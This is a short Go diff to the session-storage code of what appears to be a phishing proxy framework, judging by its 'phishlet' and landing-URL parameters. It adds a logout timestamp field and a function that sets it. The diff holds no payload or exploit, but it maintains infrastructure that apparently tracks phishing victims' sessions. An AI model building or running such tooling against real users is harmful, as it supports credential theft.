@@ -21,6 +21,7 @@ type Session struct {
 	SessionId  string                       `json:"session_id"`
 	UserAgent  string                       `json:"useragent"`
 	RemoteAddr string                       `json:"remote_addr"`
+	LogoutTime int64                        `json:"logout_time"`
 	CreateTime int64                        `json:"create_time"`
 	UpdateTime int64                        `json:"update_time"`
 }
@@ -56,6 +57,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		SessionId:  sid,
 		UserAgent:  useragent,
 		RemoteAddr: remote_addr,
+		LogoutTime: 0,
 		CreateTime: time.Now().UTC().Unix(),
 		UpdateTime: time.Now().UTC().Unix(),
 	}
@@ -120,6 +122,18 @@ func (d *Database) sessionsUpdateCustom(sid string, name string, value string) e
 		return err
 	}
 	s.Custom[name] = value
+	s.UpdateTime = time.Now().UTC().Unix()
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsSetLogoutTime(sid string) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.LogoutTime = time.Now().UTC().Unix()
 	s.UpdateTime = time.Now().UTC().Unix()
 
 	err = d.sessionsUpdate(s.Id, s)
